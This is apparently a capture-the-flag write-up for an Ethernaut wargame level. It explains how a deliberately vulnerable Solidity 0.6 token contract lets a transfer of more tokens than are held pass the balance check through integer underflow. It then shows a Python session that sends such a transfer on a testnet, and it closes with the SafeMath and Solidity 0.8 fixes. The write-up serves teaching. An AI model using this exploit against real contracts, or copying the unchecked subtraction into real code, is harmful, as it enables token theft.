# 05 - Token

## Challenge

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

Things that might help:

- What is an odometer?

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

## Summary

The contract looks quite normal. Upon constructed, 20 tokens are given to our account's balance (`await contract.balanceOf(player)` will return 20). The `transfer` function first checks if the sender has enough tokens to transfer, and then transfer the tokens.

Challenge hints about searching about properties of odometer:

![Example odometer](https://media.hswstatic.com/eyJidWNrZXQiOiJjb250ZW50Lmhzd3N0YXRpYy5jb20iLCJrZXkiOiJnaWZcL29kb21ldGVyLmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6ODI4fSwidG9Gb3JtYXQiOiJhdmlmIn19)

As we can see, after reaching the maximum reading, an odometer restarts from zero, which is called odometer rollover. This gives a hint to integer overflow/underflow. More specifically, underflow is the case here.

Explanation: We know `_value` is an uint, which must satisfy `balances[msg.sender] - _value >= 0`. If we can make `_value` larger than balance (e.g. 21), the subtraction will result in a negative number. In Solidity, this will cause integer underflow and the result will be a very big uint number, which will pass the check.

> An overflow is when a number gets incremented above its maximum value. Solidity can handle up to 256 bit numbers (up to `2^256-1`), so incrementing by 1 would result into 0.
>
> Likewise, in the inverse case, when the number is unsigned, decrementing will underflow the number, resulting in the maximum possible value.

```
  0x000000000000000000000000000000000000
- 0x000000000000000000000000000000000001
----------------------------------------
= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
```

As such, we can easily solve the level by calling `transfer` with 21 tokens.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0x2ff619001B658908BA25b34FCec75F87668C751d'
>>>
>>> account.send_transaction(contract_addr, data=encode_with_signature("transfer(address,uint256)", "0x0000000000000000000000000000000000000000", 21))
2023-06-05 22:23:26.008 | INFO     | cheb3.account:send_transaction:103 - Transaction to 0x2ff619001B658908BA25b34FCec75F87668C751d: 0x0d6337c49d15f449b4a232a8c640137e5c82423ee2d5d80869a7fa407107e53f
AttributeDict({'blockHash': HexBytes('0xcf1724fa2b1de4e93bf37c7fef37c29733e2e4bc294478de03c836ef83b3d905'), 'blockNumber': 9130839, 'contractAddress': None, 'cumulativeGasUsed': 10661304, 'effectiveGasPrice': 9000, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 31800, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x2ff619001B658908BA25b34FCec75F87668C751d', 'transactionHash': HexBytes('0x0d6337c49d15f449b4a232a8c640137e5c82423ee2d5d80869a7fa407107e53f'), 'transactionIndex': 69, 'type': 0})
```

Note that we used "0x0000000000000000000000000000000000000000" as `_to` address, but it can be anything except `player` since that will make our balance unchanged. Finally, submit the instance to pass the level.

## Afterword

In Solidity ^0.8.0, math overflows revert by default. 

Of course, in older versions, you can use OpenZeppelin's `SafeMath` library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

```js
a = a.add(c);
```

If there is an overflow, the code will revert.